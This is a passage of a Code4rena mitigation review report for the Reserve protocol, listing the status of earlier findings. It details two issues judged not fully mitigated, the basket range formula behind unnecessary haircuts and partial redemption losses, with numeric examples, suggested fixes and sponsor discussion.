0xA5DF (<a href=\"https://github.com/code-423n4/2023-02-reserve-mitigation-contest-findings/issues/70\">here</a> and <a href=\"https://github.com/code-423n4/2023-02-reserve-mitigation-contest-findings/issues/55\">here</a>), and also shared below</td>\n</tr>\n<tr>\n<td><a href=\"https://github.com/code-423n4/2023-01-reserve-findings/issues/377\">M-06</a></td>\n<td>Per judge: invalid</td>\n<td><a href=\"https://github.com/code-423n4/2023-01-reserve-findings/issues/377#issuecomment-1428771851\">Comment from judge</a></td>\n</tr>\n<tr>\n<td><a href=\"https://github.com/code-423n4/2023-01-reserve-findings/issues/347\">M-07</a></td>\n<td>Confirmed by sponsor</td>\n<td>-</td>\n</tr>\n<tr>\n<td><a href=\"https://github.com/code-423n4/2023-01-reserve-findings/issues/326\">M-08</a></td>\n<td>Acknowledged by sponsor</td>\n<td>-</td>\n</tr>\n<tr>\n<td><a href=\"https://github.com/code-423n4/2023-01-reserve-findings/issues/325\">M-09</a></td>\n<td>Per judge: invalid</td>\n<td><a href=\"https://github.com/code-423n4/2023-01-reserve-findings/issues/325#issuecomment-1428774156\">Comment from judge</a></td>\n</tr>\n<tr>\n<td><a href=\"https://github.com/code-423n4/2023-01-reserve-findings/issues/320\">M-10</a></td>\n<td>Mitigation confirmed</td>\n<td>Reports from <a href=\"https://github.com/code-423n4/2023-02-reserve-mitigation-contest-findings/issues/19\">HollaDieWaldfee</a>, <a href=\"https://github.com/code-423n4/2023-02-reserve-mitigation-contest-findings/issues/56\">0xA5DF</a>, and <a href=\"https://github.com/code-423n4/2023-02-reserve-mitigation-contest-findings/issues/33\">AkshaySrivastav</a></td>\n</tr>\n<tr>\n<td><a href=\"https://github.com/code-423n4/2023-01-reserve-findings/issues/287\">M-11</a></td>\n<td>Mitigation confirmed w/ comments</td>\n<td>Reports from <a href=\"https://github.com/code-423n4/2023-02-reserve-mitigation-contest-findings/issues/18\">HollaDieWaldfee</a>, <a href=\"https://github.com/code-423n4/2023-02-reserve-mitigation-contest-findings/issues/57\">0xA5DF</a>, and <a href=\"https://github.com/code-423n4/2023-02-reserve-mitigation-contest-findings/issues/34\">AkshaySrivastav</a></td>\n</tr>\n<tr>\n<td><a href=\"https://github.com/code-423n4/2023-01-reserve-findings/issues/276\">M-12</a></td>\n<td>Mitigation confirmed</td>\n<td>Reports from <a href=\"https://github.com/code-423n4/2023-02-reserve-mitigation-contest-findings/issues/58\">0xA5DF</a>, <a href=\"https://github.com/code-423n4/2023-02-reserve-mitigation-contest-findings/issues/11\">HollaDieWaldfee</a>, and <a href=\"https://github.com/code-423n4/2023-02-reserve-mitigation-contest-findings/issues/36\">AkshaySrivastav</a></td>\n</tr>\n<tr>\n<td><a href=\"https://github.com/code-423n4/2023-01-reserve-findings/issues/267\">M-13</a></td>\n<td>Mitigation confirmed w/ comments</td>\n<td>Reports from <a href=\"https://github.com/code-423n4/2023-02-reserve-mitigation-contest-findings/issues/10\">HollaDieWaldfee</a>, <a href=\"https://github.com/code-423n4/2023-02-reserve-mitigation-contest-findings/issues/59\">0xA5DF</a>, and <a href=\"https://github.com/code-423n4/2023-02-reserve-mitigation-contest-findings/issues/37\">AkshaySrivastav</a></td>\n</tr>\n<tr>\n<td><a href=\"https://github.com/code-423n4/2023-01-reserve-findings/issues/265\">M-14</a></td>\n<td>Acknowledged by sponsor</td>\n<td>-</td>\n</tr>\n<tr>\n<td><a href=\"https://github.com/code-423n4/2023-01-reserve-findings/issues/258\">M-15</a></td>\n<td>Mitigation confirmed w/ comments</td>\n<td>Reports from <a href=\"https://github.com/code-423n4/2023-02-reserve-mitigation-contest-findings/issues/9\">HollaDieWaldfee</a>, <a href=\"https://github.com/code-423n4/2023-02-reserve-mitigation-contest-findings/issues/60\">0xA5DF</a>, and <a href=\"https://github.com/code-423n4/2023-02-reserve-mitigation-contest-findings/issues/39\">AkshaySrivastav</a></td>\n</tr>\n<tr>\n<td><a href=\"https://github.com/code-423n4/2023-01-reserve-findings/issues/254\">M-16</a></td>\n<td>Not fully mitigated</td>\n<td>Report from <a href=\"https://github.com/code-423n4/2023-02-reserve-mitigation-contest-findings/issues/73\">AkshaySrivastav</a>, and also shared below</td>\n</tr>\n<tr>\n<td><a href=\"https://github.com/code-423n4/2023-01-reserve-findings/issues/234\">M-17</a></td>\n<td>Acknowledged by sponsor</td>\n<td>-</td>\n</tr>\n<tr>\n<td><a href=\"https://github.com/code-423n4/2023-01-reserve-findings/issues/211\">M-18</a></td>\n<td>Mitigation confirmed</td>\n<td>Reports from <a href=\"https://github.com/code-423n4/2023-02-reserve-mitigation-contest-findings/issues/7\">HollaDieWaldfee</a>, <a href=\"https://github.com/code-423n4/2023-02-reserve-mitigation-contest-findings/issues/62\">0xA5DF</a>, and <a href=\"https://github.com/code-423n4/2023-02-reserve-mitigation-contest-findings/issues/42\">AkshaySrivastav</a></td>\n</tr>\n<tr>\n<td><a href=\"https://github.com/code-423n4/2023-01-reserve-findings/issues/210\">M-19</a></td>\n<td>Acknowledged by sponsor</td>\n<td>-</td>\n</tr>\n<tr>\n<td><a href=\"https://github.com/code-423n4/2023-01-reserve-findings/issues/200\">M-20</a></td>\n<td>Mitigation confirmed w/ comments</td>\n<td>Reports from <a href=\"https://github.com/code-423n4/2023-02-reserve-mitigation-contest-findings/issues/21\">HollaDieWaldfee</a>, <a href=\"https://github.com/code-423n4/2023-02-reserve-mitigation-contest-findings/issues/63\">0xA5DF</a>, and <a href=\"https://github.com/code-423n4/2023-02-reserve-mitigation-contest-findings/issues/77\">AkshaySrivastav</a></td>\n</tr>\n<tr>\n<td><a href=\"https://github.com/code-423n4/2023-01-reserve-findings/issues/148\">M-21</a></td>\n<td>Mitigation confirmed</td>\n<td>Reports from <a href=\"https://github.com/code-423n4/2023-02-reserve-mitigation-contest-findings/issues/6\">HollaDieWaldfee</a>, <a href=\"https://github.com/code-423n4/2023-02-reserve-mitigation-contest-findings/issues/71\">0xA5DF</a>, and <a href=\"https://github.com/code-423n4/2023-02-reserve-mitigation-contest-findings/issues/44\">AkshaySrivastav</a></td>\n</tr>\n<tr>\n<td><a href=\"https://github.com/code-423n4/2023-01-reserve-findings/issues/106\">M-22</a></td>\n<td>Mitigation confirmed</td>\n<td>Reports from <a href=\"https://github.com/code-423n4/2023-02-reserve-mitigation-contest-findings/issues/5\">HollaDieWaldfee</a> and <a href=\"https://github.com/code-423n4/2023-02-reserve-mitigation-contest-findings/issues/64\">0xA5DF</a></td>\n</tr>\n<tr>\n<td><a href=\"https://github.com/code-423n4/2023-01-reserve-findings/issues/64\">M-23</a></td>\n<td>Mitigation confirmed w/ comments</td>\n<td>Reports from <a href=\"https://github.com/code-423n4/2023-02-reserve-mitigation-contest-findings/issues/65\">0xA5DF</a>, <a href=\"https://github.com/code-423n4/2023-02-reserve-mitigation-contest-findings/issues/4\">HollaDieWaldfee</a>, and <a href=\"https://github.com/code-423n4/2023-02-reserve-mitigation-contest-findings/issues/45\">AkshaySrivastav</a></td>\n</tr>\n<tr>\n<td><a href=\"https://github.com/code-423n4/2023-01-reserve-findings/issues/39\">M-24</a></td>\n<td>Mitigation confirmed</td>\n<td>Reports from <a href=\"https://github.com/code-423n4/2023-02-reserve-mitigation-contest-findings/issues/66\">0xA5DF</a>, <a href=\"https://github.com/code-423n4/2023-02-reserve-mitigation-contest-findings/issues/3\">HollaDieWaldfee</a>, and <a href=\"https://github.com/code-423n4/2023-02-reserve-mitigation-contest-findings/issues/46\">AkshaySrivastav</a></td>\n</tr>\n<tr>\n<td><a href=\"https://github.com/code-423n4/2023-01-reserve-findings/issues/16\">M-25</a></td>\n<td>Mitigation confirmed</td>\n<td>Reports from <a href=\"https://github.com/code-423n4/2023-02-reserve-mitigation-contest-findings/issues/2\">HollaDieWaldfee</a>, <a href=\"https://github.com/code-423n4/2023-02-reserve-mitigation-contest-findings/issues/67\">0xA5DF</a>, and <a href=\"https://github.com/code-423n4/2023-02-reserve-mitigation-contest-findings/issues/47\">AkshaySrivastav</a></td>\n</tr>\n</tbody>\n</table>\n<p><strong>There were also 3 new medium severity issues surfaced by the wardens. See below for details regarding the new issues as well as issues that were not fully mitigated.</strong><br></p>\n<h2 id=\"mitigation-of-h-02-issue-not-fully-mitigated\" style=\"position:relative;\"><a href=\"#mitigation-of-h-02-issue-not-fully-mitigated\" aria-label=\"mitigation of h 02 issue not fully mitigated permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2023-02-reserve-mitigation-contest-findings/issues/49\">Mitigation of H-02: Issue not fully mitigated</a></h2>\n<p><em>Submitted by 0xA5DF</em></p>\n<h3 id=\"original-issue\" style=\"position:relative;\"><a href=\"#original-issue\" aria-label=\"original issue permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Original Issue</h3>\n<p>H-02: <a href=\"https://github.com/code-423n4/2023-01-reserve-findings/issues/235\">Basket range formula is inefficient, leading the protocol to unnecessary haircut</a></p>\n<h3 id=\"lines-of-code\" style=\"position:relative;\"><a href=\"#lines-of-code\" aria-label=\"lines of code permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Lines of code</h3>\n<p><a href=\"https://github.com/reserve-protocol/protocol/blob/610cfca553beea41b9508abbfbf4ee4ce16cbc12/contracts/p1/mixins/RecollateralizationLib.sol#L146-L245\">https://github.com/reserve-protocol/protocol/blob/610cfca553beea41b9508abbfbf4ee4ce16cbc12/contracts/p1/mixins/RecollateralizationLib.sol#L146-L245</a></p>\n<h3 id=\"not-mitigated---top-range-can-still-be-too-high-leading-to-unnecessary-haircut\" style=\"position:relative;\"><a href=\"#not-mitigated---top-range-can-still-be-too-high-leading-to-unnecessary-haircut\" aria-label=\"not mitigated   top range can still be too high leading to unnecessary haircut permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Not mitigated - top range can still be too high, leading to unnecessary haircut</h3>\n<ul>\n<li>The applied mitigation follows the line of the mitigation suggested (disclosure: by me :)) in the original issue, however after reviewing it I found out that it doesn’t fully mitigate the issue.</li>\n<li>The original issue was that basket range band is too wide, with both top range being too high and bottom range too low</li>\n<li>The bottom range is mitigated now</li>\n<li>As for the top range - even though it’s more efficient now, it still can result in a top range that doesn’t make sense.</li>\n</ul>\n<h3 id=\"impact-5\" style=\"position:relative;\"><a href=\"#impact-5\" aria-label=\"impact 5 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Impact</h3>\n<p>Protocol might go for an unnecessary haircut, causing a loss for RToken holders.\nIn the scenario below we can trade to get ~99% of baskets needed, but instead the protocol goes for a 50% haircut.</p>\n<p>After the haircut the baskets held per supply ratio might grow back via <code>handoutExcessAssets</code> and <code>Furnace</code> however:</p>\n<ul>\n<li>Not all excess asset goes to <code>Furnace</code></li>\n<li>\n<p><code>Furnace</code> grows slowly over time and in the meantime</p>\n<ul>\n<li>Redemption would be at the lower baskets per supply</li>\n<li>New users can issue in the meanwhile, diluting the melting effect</li>\n</ul>\n</li>\n</ul>\n<p>In more extreme cases the baskets held can be an extremely low number that might even cause the haircut to fail due to <code>exchangeRateIsValidAfter</code> modifier on <code>setBasketsNeeded()</code>. This would mean trading would be disabled till somebody sends enough balance to the undercollateralized asset.</p>\n<h3 id=\"proof-of-concept-24\" style=\"position:relative;\"><a href=\"#proof-of-concept-24\" aria-label=\"proof of concept 24 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p>Consider the following scenario:</p>\n<ul>\n<li>A basket is composed of 30 USDc and 1 ETH</li>\n<li>\n<p>The prices are:</p>\n<ul>\n<li>1 USDc = 1 USD</li>\n<li>ETH = 1500 USD</li>\n</ul>\n</li>\n<li>Therefore the total basket value is 1515 USD</li>\n<li>Protocol holds 1000 baskets</li>\n<li>Governance changes the USDC quantity to 30 USDC</li>\n<li>Baskets held now is only 500, since we hold only 15K USDC</li>\n<li>Bottom range would be <code>basketsHeld + (excess_ETH * ETH_lowPrice / basket_highPrice) = 500 + (1500 * 500 * 0.99 / (1530 * 1.01)) = 980</code></li>\n<li>Top range would be <code>basketsHeld + (excess_ETH * ETH_highPrice / basket_lowPrice) = 500 + (1500 * 500 * 1.01 / (1530 * 0.99)) = 1000</code></li>\n<li>This is clearly a wrong estimation, which would lead to a haircut of 50% (!) rather than going for a trade.</li>\n</ul>\n<p>Note: I mentioned governance change for simplicity, but this can also happen without governance intervention when a collateral gets disabled, it’s value declines and a backup asset kicks in (at first the disabled asset would get traded and cover up some of the deficit and then we’d go for a haircut)</p>\n<h3 id=\"mitigation-1\" style=\"position:relative;\"><a href=\"#mitigation-1\" aria-label=\"mitigation 1 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Mitigation</h3>\n<ul>\n<li>\n<p>A more efficient formula would be to use the max baskets held (i.e. the maximum of (each collateral balance divided by the basket_quantity of that collateral)) and then subtract from that the lowest estimation of baskets missing (i.e. lowest value estimation of needed assets to reach that amount divided by highest estimation of basket value).</p>\n<ul>\n<li>In the case above that would mean <code>maxBasketsHeld - (USDC_deficit * USDC_lowPrice / basket_highPrice) = 1000 - (500 * 30 * 0.99 / (1530 * 1.01)) = 990.4</code>. Freeing up 9.6 ETH for sale</li>\n</ul>\n</li>\n<li>The suggested formula might get us a higher top range estimation when the case is the other way around (the collateral that makes the larger part of the basket value is missing, in our case ETH is missing and USDC not), but it wouldn’t result in a haircut and still go for trading (since the top range would be closer to baskets held)</li>\n</ul>\n<p>Even with the mitigation above there can be extreme cases where a single asset holds a very small fraction of the total basket value (e.g. 0.1%) and the mitigation wouldn’t help much in this case. There might be a need to come up with a broader mitigation for the issue that haircut is done to the number of baskets held rather than bottom range even though the difference between the two can be significant. Or set a threshold for the fraction of the value that each collateral holds in the total value of the basket.</p>\n<p><strong><a href=\"https://github.com/code-423n4/2023-02-reserve-mitigation-contest-findings/issues/49#issuecomment-1435296142\">tbrent (Reserve) confirmed and commented</a>:</strong></p>\n<blockquote>\n<p>Confirming, but I believe this issue can only arise when the basket unit is increased in <code>{UoA}</code> terms. Can someone confirm this? Does the issue exist when a basket unit is simply allocated differently, as opposed to being increased in size? </p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2023-02-reserve-mitigation-contest-findings/issues/49#issuecomment-1435768983\">0xA5DF (warden) commented</a>:</strong></p>\n<blockquote>\n<blockquote>\n<p> Does the issue exist when a basket unit is simply allocated differently</p>\n</blockquote>\n<p>Usually when it’s only allocated differently the asset which was decreased in quantity would be used to cover up for the asset that was increased (since top range is capped to baskets needed, the decreased asset would have a surplus). However there can be a scenario under difference in allocation:</p>\n<ul>\n<li>Asset A (worth 1515 USD) was switched to mostly asset B (1 ETH as above) and some of asset C (quantity increased from 15 USDC to 30 USDC)</li>\n<li>All of asset A was traded for asset B first (since asset B is missing more in value + oracle error caused a 1% difference in price)</li>\n<li>We’re now facing the same issue as above - we’ve got 100% of basket B</li>\n</ul>\n<p>Plus, as mentioned above this can also happen when a collateral gets disabled, went down in value and was switched to backup collateral</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2023-02-reserve-mitigation-contest-findings/issues/49#issuecomment-1435769665\">tbrent (Reserve) commented</a>:</strong></p>\n<blockquote>\n<p>@0xA5DF shouldn’t the <code>range.top</code> mitigation algo include a (positive) contribution from assets that are not in the basket? That is:</p>\n<p>if <code>quantity() > 0</code>: then we subtract out  <code>(asset_deficit * asset_lowPrice / basket_highPrice)</code><br>\nelse: then we add in <code>(asset_balance * asset_highPrice / basket_lowPrice)</code></p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2023-02-reserve-mitigation-contest-findings/issues/49#issuecomment-1435771369\">0xA5DF (warden) commented</a>:</strong></p>\n<blockquote>\n<p>Yeah, assets that not in the baskets or in the basket and more than needed.</p>\n<p>As I mentioned in some edge cases the issue still might persist. Maybe as part of the mitigation we should also don’t do a haircut to an amount that’s significantly lower than the bottom range.<br>\nE.g. if the baskets held is 50% (of needed baskets) and bottom range is 98% we should do a haircut only down to 95% (and hopefully in the next round there are more chances we’ll be able to trade).</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2023-02-reserve-mitigation-contest-findings/issues/49#ref-pullrequest-1590520362\">tbrent (Reserve) linked to a mitigation PR</a>:</strong></p>\n<blockquote>\n<p><a href=\"https://github.com/reserve-protocol/protocol/pull/650\">reserve-protocol/protocol#650</a></p>\n</blockquote>\n<hr>\n<h2 id=\"mitigation-of-m-04-issue-not-fully-mitigated\" style=\"position:relative;\"><a href=\"#mitigation-of-m-04-issue-not-fully-mitigated\" aria-label=\"mitigation of m 04 issue not fully mitigated permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2023-02-reserve-mitigation-contest-findings/issues/54\">Mitigation of M-04: Issue not fully mitigated</a></h2>\n<p><em>Submitted by 0xA5DF, also found by <a href=\"https://github.com/code-423n4/2023-02-reserve-mitigation-contest-findings/issues/14\">HollaDieWaldfee</a> and <a href=\"https://github.com/code-423n4/2023-02-reserve-mitigation-contest-findings/issues/69\">AkshaySrivastav</a></em></p>\n<h3 id=\"original-issue-1\" style=\"position:relative;\"><a href=\"#original-issue-1\" aria-label=\"original issue 1 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Original Issue</h3>\n<p>M-04: <a href=\"https://github.com/code-423n4/2023-01-reserve-findings/issues/399\">Redemptions during undercollateralization can be hot-swapped to steal all funds</a></p>\n<h3 id=\"lines-of-code-1\" style=\"position:relative;\"><a href=\"#lines-of-code-1\" aria-label=\"lines of code 1 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Lines of code</h3>\n<p><a href=\"https://github.com/reserve-protocol/protocol/blob/610cfca553beea41b9508abbfbf4ee4ce16cbc12/contracts/p1/RToken.sol#L215\">https://github.com/reserve-protocol/protocol/blob/610cfca553beea41b9508abbfbf4ee4ce16cbc12/contracts/p1/RToken.sol#L215</a></p>\n<h3 id=\"impact-6\" style=\"position:relative;\"><a href=\"#impact-6\" aria-label=\"impact 6 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Impact</h3>\n<p>User might be agreeing to a partial redemption expecting to lose only a small fraction, but end up losing a significantly higher fraction.</p>\n<p><strong>Details</strong></p>\n<ul>\n<li>Issue was that user might get only partial redemption when they didn’t intend to - they sent a tx to the pool, in the meanwhile an asset got disabled and replaced. Redeemer doesn’t get any share of the disabled collateral, and the backup collateral balance is zero.</li>\n<li>Mitigation adds a parameter named <code>revertOnPartialRedemption</code>, if the parameter is false the redeeming would revert if any collateral holds only part of the asset.</li>\n<li>This is suppose to solve this issue since in the case above the user would set it to false and the redeeming tx would revert</li>\n<li>The issue is that there might be a case where the protocol holds only a bit less than the quantity required (e.g. 99%), and in that case the user would be setting <code>revertOnPartialRedemption</code> to true, expecting to get 99% of the value of the basket. Then if an asset is disabled and replaced the user would suffer a loss much greater than they’ve agreed to.</li>\n</ul>\n<h3 id=\"proof-of-concept-25\" style=\"position:relative;\"><a href=\"#proof-of-concept-25\" aria-label=\"proof of concept 25 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p><strong>Likelihood</strong>\nMostly the protocol wouldn’t be undercollateralized for a long time, since there would either by trading going on to cover it or eventually there would be a haircut. But there can still be periods of time where this happens:</p>\n<ul>\n<li>Governance increased the basket quantity of one asset a bit (expecting the yield to cover for it), trading won’t start till <code>tradingDelay</code> passes. Meaning a few hours where only partial redemption would be possible.</li>\n<li>Another asset got disabled first, and replaced by a backup asset. The protocol either had enough balance of the backup asset or covered up for it via trading. Yet again, this won’t last long since eventually all trading would complete and the protocol would go to a haircut, but there can be multiple trading of multiple assets which would make it last up to a few hours.</li>\n</ul>\n<h3 id=\"mitigation-2\" style=\"position:relative;\"><a href=\"#mitigation-2\" aria-label=\"mitigation 2 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Mitigation</h3>\n<p>The ideal solution would be to allow the user to specify the min amount for each asset or the min ratio of the between the total redemption value and the basket value, but that would be too expensive and complicated.\nI think the middle way here would be to replace <code>revertOnPartialRedemption</code> parameter with a single numeric parameter that specifies the min ratio that the user expects to get (i.e. if that parameter is set to 90%, that means that if any asset holds less than 90% than the quantity it should the redemption would revert).\nThis shouldn’t cost much more gas, and would cover most of the cases.</p>\n<p><strong><a 